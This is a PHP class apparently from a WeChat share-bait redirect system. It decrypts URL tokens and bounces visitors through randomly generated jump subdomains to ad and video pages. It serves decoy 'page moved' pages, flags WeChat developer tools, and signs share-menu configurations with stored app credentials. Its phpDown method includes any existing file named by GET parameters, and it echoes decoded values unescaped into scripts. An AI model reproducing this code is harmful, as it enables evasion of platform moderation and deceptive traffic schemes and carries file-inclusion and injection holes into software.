<?php
include_once 'crypt.php';

/**
 *
 */
class Init
{
    private $_Invalid = false;
    private $_InvalidGet = false;
    private $_InvalidPost = false;
    private $_Des = null;
    private $_ErrorPage = null;
    public $daixian = null;
    private $_Data = null;
    private $_Script = "<script type='text/javascript' charset='utf-8'>%s</script>";
    private $_Src = "<script src='%s' charset='utf-8'></script>";

    public $prefix = null;
    public $suffix = null;
    public $iswx = null;
    public $isMobile = null;


    public function __construct()
    {
        $this->init(include 'pp.php');
        if (array_key_exists('prefix', $_GET) && array_key_exists('suffix', $_GET)) {
            $this->_Invalid    = true;
            $this->_InvalidGet = true;
            $this->prefix      = $_GET['prefix'];
            $this->suffix      = $_GET['suffix'];
        } elseif (array_key_exists('index', $_POST)) {
            $this->_Invalid     = true;
            $this->_InvalidPost = true;
        } elseif (array_key_exists('daixian', $_GET)) {
            $this->daixian = $_GET['daixian'];
        }
    }

    public function daixian()
    {
        $this->Header($this->_Data['sp_jump'] . $this->_Des->authcode('isshare=2', '', $this->_Data['key']) . ".xiche?from=dai");
    }

    public function boardDecode()
    {
        $des = $this->_Des->authcode($this->prefix, 'DECODE', $this->_Data['key']);
        if (false === $des /*|| !array_key_exists('from', $_GET)*/) {
            $this->error();
        } else {
            parse_str($des, $temp);
            if (array_key_exists('cash', $temp)) {
                if (array_key_exists('host', $temp)) {
                    $this->Header("http://{$temp['host']}/" . $this->_Des->authcode('isshare=2', '', $this->_Data['key']) . ".{$temp['help']}?from={$_GET['from']}");
                } else {
                    # code...
                    # 此行打开表示广告跳转到广告域名
                    //$ggurl11=$this->_Data['gg_url'] . "?cash={$temp['cash']}";
                    //echo '<img src="http://wx4.sinaimg.cn/mw690/0073dwlUgy1fvv3xsqepej301c01c0kf.jpg" onload="javascript: setTimeout(function(){  window.location.href=\''.$ggurl11.'\'},1);" style="width:90vw;margin:50px auto;" class="KolImg"/>';
                    $this->Header($this->_Data['gg_url'] . "?cash={$temp['cash']}");
                }
            } elseif (array_key_exists('isshare', $temp)) {
                if (array_key_exists('toopen', $this->_Data)) {
                    exit(sprintf($this->_Script, "location.href='" . $this->_Data['toopen'] . "'"));
                } else {
                    header("Content-Type: text/html; charset=UTF-8");
                    echo '<head><title>页面不存在</title></head><body><h1>网页已移动</h1>点击<a HREF="http://news.sogou.com">此处</a>打开该网站</body>';
                    $this->Header($this->_Data['sp_jump'] . $this->_Des->authcode("isshare&audkey={$temp['audkey']}", '', $this->_Data['key'], 30) . ".cloud{$temp['isshare']}");
                }
            } else {
                $this->error();
            }
        }
    }

    public function Down()
    {
        if (array_key_exists('HTTP_REFERER', $_SERVER)) {
            if (false && strpos($_SERVER['HTTP_REFERER'], $this->_Data['sp_jump']) === false && strpos($_SERVER['HTTP_REFERER'], $this->_Data['sp_url']) === false && strpos($_SERVER['HTTP_REFERER'], $this->_Data['sp_tuig']) === false && strpos($_SERVER['HTTP_REFERER'], $this->_Data['temp']) === false) {
                $this->error();
            } else {
                $des = $this->_Des->authcode($this->prefix, 'DECODE', $this->_Data['key']);
                if (false === $des) {
                    $this->error();
                } else {
                    parse_str($des, $temp);
                    if (array_key_exists('tip', $temp)) {
                        $string = sprintf($this->_Script, "var tip = '{$temp['tip']}',videoIndex = '{$temp['audkey']}';");
                        $string .= sprintf($this->_Src, "aliyun.js?t=" . time());
                        exit($string);
                    } else {
                        $this->error();
                    }
                }
            }
        } else {
            $this->error();
        }
    }

    public function tipPost()
    {
        header('Content-Type: application/json');
        if ('ok' === $_POST['index']) {
            $temp['url'] = $this->_Data['sp_jump'] . $this->_Des->authcode("ok&audkey={$_POST['audkey']}", '', $this->_Data['key']) . ".ok";
        } elseif ('goon' === $_POST['index']) {
            $temp['url'] = $this->_Data['sp_jump'] . $this->_Des->authcode("goon&audkey={$_POST['audkey']}", '', $this->_Data['key'], 5000) . ".goon";
        } elseif ('jump' === $_POST['index']) {
            $temp = $this->share(include 'share.php');
        } elseif ('duapp' === $_POST['index']) {
            $temp = $this->duapp(include 'duapp.php');
        } elseif ('wx5' === $_POST['index']) {
            $temp['url'] = $this->_Data['gg_url'] ."?cash=nk";
        } else {
            $temp['msg'] = 'error';
        }
        ob_clean();
        echo json_encode($temp);
    }

    public function isDown()
    {
        $des = $this->_Des->authcode($this->prefix, 'DECODE', $this->_Data['key']);
        parse_str($des, $temp);
        if (false === $des) {
            $this->error();
        } elseif (array_key_exists('isshare',$temp)) {
            exit(sprintf($this->_Script, "location.href='" . $this->_Data['sp_play'] . $this->_Des->authcode("tip=start&audkey={$temp['audkey']}", '', $this->_Data['key'], 3600) . ".lin'"));
        } else {
            $this->error();
        }
    }

    public function ggDown()
    {
        header("Content-Type: text/html; charset=UTF-8");
        echo '<head><title>页面加载中</title></head><body><h1>网页已移动</h1>点击<a HREF="http://news.sogou.com/an8fr.bmp?y=50fae0061500dac695bf0bd6067be4de&t=1528815378009">此处</a>打开该网站</body>';
        exit(sprintf($this->_Script, "location.href='" . $this->_Data['gg_url'] . "?cash=" . $this->prefix . "'"));
    }

    public function tipDown()
    {
        $des = $this->_Des->authcode($this->prefix, 'DECODE', $this->_Data['key']);
        parse_str($des, $temp);
        if (false === $des) {
            $this->error();
        } elseif (array_key_exists('ok',$temp)) {
            exit(sprintf($this->_Script, "location.href='" . $this->_Data['sp_url'] . $this->_Des->authcode('tip=ok&audkey='.$temp['audkey'], '', $this->_Data['key'], 60) . ".bin'"));
        } elseif (array_key_exists('goon',$temp)) {
            exit(sprintf($this->_Script, "location.href='" . $this->_Data['sp_url'] . $this->_Des->authcode('tip=goon&audkey='.$temp['audkey'], '', $this->_Data['key'], 600) . ".dou'"));
        } else {
            $this->error();
        }
    }

    public function tgDown()
    {
        header('Content-Type: application/json');
        $temp['sp_url'] = $this->_Data['sp_url'] . $this->_Des->authcode('tip=start', '', $this->_Data['key'], 600) . '.zhe';
        ob_clean();
        echo json_encode($temp);
    }


    public function phpDown()
    {
        $filename = $this->prefix . '.' . $this->suffix;
        if ('index.php' !== $filename && file_exists($filename)) {
            include_once $filename;
        } else {
            $this->error();
        }
    }


    public function echoTxt()
    {
        exit(str_replace("MP_verify_", '', $this->prefix));
    }

    private function duapp($data)
    {
        if (empty($data)) {
            $this->error();
        }
        $applink = '/' . $this->_Des->authcode('isshare=1&audkey='.$_POST['audkey'], '', $this->_Data['key']) . '.xiche';

        $timelink = '/' . $this->_Des->authcode('isshare=2&audkey='.$_POST['audkey'], '', $this->_Data['key']) . '.xiche';

        if ('0' !== $_POST['TTimes']) {
            $ztitle  = $data['video'][$_POST['audkey']]['stitle'];
            $zimgurl = $data['video'][$_POST['audkey']]['simgurl'];
            $zlink   = '/' . $this->_Des->authcode($data['video'][$_POST['audkey']]['slink'], '', $this->_Data['key']) . '.xiche';
        } else {
            $ztitle  = $data['video'][$_POST['audkey']]['title'];
            $zimgurl = $data['video'][$_POST['audkey']]['imgurl'];
            $zlink   = $applink;
        }

        if ('0' !== $_POST['ATimes']) {
            $gtitle  = $data['video'][$_POST['audkey']]['stitle'];
            $gimgurl = $data['video'][$_POST['audkey']]['simgurl'];
            $glink   = '/' . $this->_Des->authcode($data['video'][$_POST['audkey']]['slink'], '', $this->_Data['key']) . '.xiche';
        } else {
            $gtitle  = $data['video'][$_POST['audkey']]['title'];
            $gimgurl = $data['video'][$_POST['audkey']]['imgurl'];
            $glink   = $timelink;
        }

        if ('0' !== $_POST['Timeline']) {
            $share_info = $data['share_info_qun'];
        } else {
            $share_info = $data['share_info_quan'];
        }

        $mtemp = array(
            'share_app_info'           => array(
                'link'    => $applink,
                'img_url' => $data['video'][$_POST['audkey']]['imgurl'],
                'title'   => $data['video'][$_POST['audkey']]['title'],
                'desc'    => $data['video'][$_POST['audkey']]['desc'],
            ),
            'share_timeline_info'      => array(
                'link'    => $timelink,
                'title'   => $data['video'][$_POST['audkey']]['qtitle'],
                'img_url' => $data['video'][$_POST['audkey']]['qimgurl'],
                'desc'    => $data['video'][$_POST['audkey']]['desc'],
            ),
            'share_timeline_cash_info' => array(
                'link'    => $zlink,
                'title'   => $ztitle,
                'img_url' => $zimgurl,
                'desc'    => $data['video'][$_POST['audkey']]['desc'],
            ),
            'share_gg_info'            => array(
                'link'    => $glink,
                'img_url' => $gimgurl,
                'title'   => $gtitle,
                'desc'    => $data['video'][$_POST['audkey']]['sdesc'],
            ),
            'share_info'               => $share_info,
        );

        return $mtemp;
    }

    private function share($data)
    {
        if (empty($data)) {
            $this->error();
        }

        $weixin = [];

        foreach ($data as $key => $value) {

            // 跳板链接的域名
            $weixin[$key]['qun']  = 'http://' . $this->getRandChar(mt_rand(3, 8)) . $value[0]; // 群跳板
            $weixin[$key]['quan'] = 'http://' . $this->getRandChar(mt_rand(3, 8)) . $value[1]; // 圈跳板
            // 公众号 appid  appsecret
            $weixin[$key]['appid']     = $value[2];
            $weixin[$key]['appsecret'] = $value[3];
        }
        //使用PP落地域名，不用share落地域名
        $host2 = parse_url($_POST['url'])['host'];

        //$domain = substr($host2, strpos($host2, '.') + 1);

        if (array_key_exists($host2, $weixin)) {
            $temp = $weixin[$host2];
            return $this->jump($temp['appid'], $temp['appsecret'], $temp['qun'], $temp['quan'], $host2);
        } else {
            return ['msg' => 'error'];
        }
    }


    private function jump($appid, $appsecret, $qun, $quan, $linename)
    {
        include_once 'jssdk.php';
        $jssdk = new JSSDK($appid, $appsecret, $linename);
        $temp  = $jssdk->getSignPackage($_POST['url']);
        $data  = array(
            'config' => array(
                'debug'     => false,
                'timestamp' => $temp['timestamp'],
                'nonceStr'  => $temp['nonceStr'],
                'signature' => $temp['signature'],
                'appId'     => $temp['appId'],
                'jsApiList' => ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems", "hideOptionMenu"],
            ),
            'qun'    => $qun,
            'quan'   => $quan,
        );
        return $data;
    }

    private function getRandChar($length)
    {
        $str    = null;
        $strPol = "0123456789abcdefghijklmnopqrstuvwxyz";
        $max    = strlen($strPol) - 1;

        for ($i = 0; $i < $length; $i++) {
            $str .= $strPol[rand(0, $max)];
        }
        return $str . '.';
    }

    public function error()
    {
        exit($this->_ErrorPage);
    }


    private function Header($str)
    {
        header("Location: {$str}");
    }


    private function init($data)
    {
        $this->_ErrorPage = file_get_contents('error.html');
        if (empty($data)) {
            $this->error();
        }
        foreach ($data as $key => $val) {
            if ($key == 'key') {
                continue;
            }
            if ($key == 'sp_url') {
                //$data[$key]  = 'http://' . $val . '/';
            }
            $data[$key]  = 'http://' . $val . '/';
        }
        $this->_Data    = $data;
        $this->_Des     = new StdDes;
        $this->iswx     = $this->isweixin();
        $this->isMobile = $this->isMobile();
    }


    private function isweixin()
    {
        if (array_key_exists('HTTP_USER_AGENT', $_SERVER) && strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false && false === stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')) {
            return true;
        }
        return false;
    }

    private function isMobile()
    {
        $useragent               = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
        $useragent_commentsblock = preg_match('|\(.*?\)|', $useragent, $matches) > 0 ? $matches[0] : '';
        function CheckSubstrs($substrs, $text)
        {
            foreach ($substrs as $substr)
                if (false !== strpos($text, $substr)) {
                    return true;
                }
            return false;
        }

        $mobile_os_list    = array('Google Wireless Transcoder', 'Windows CE', 'WindowsCE', 'Symbian', 'Android', 'armv6l', 'armv5', 'Mobile', 'CentOS', 'mowser', 'AvantGo', 'Opera Mobi', 'J2ME/MIDP', 'Smartphone', 'Go.Web', 'Palm', 'iPAQ');
        $mobile_token_list = array('Profile/MIDP', 'Configuration/CLDC-', '160×160', '176×220', '240×240', '240×320', '320×240', 'UP.Browser', 'UP.Link', 'SymbianOS', 'PalmOS', 'PocketPC', 'SonyEricsson', 'Nokia', 'BlackBerry', 'Vodafone', 'BenQ', 'Novarra-Vision', 'Iris', 'NetFront', 'HTC_', 'Xda_', 'SAMSUNG-SGH', 'Wapaka', 'DoCoMo', 'iPhone', 'iPod');

        $found_mobile = CheckSubstrs($mobile_os_list, $useragent_commentsblock) ||
            CheckSubstrs($mobile_token_list, $useragent);

        if ($found_mobile) {
            return true;
        } else {
            return false;
        }
    }
}
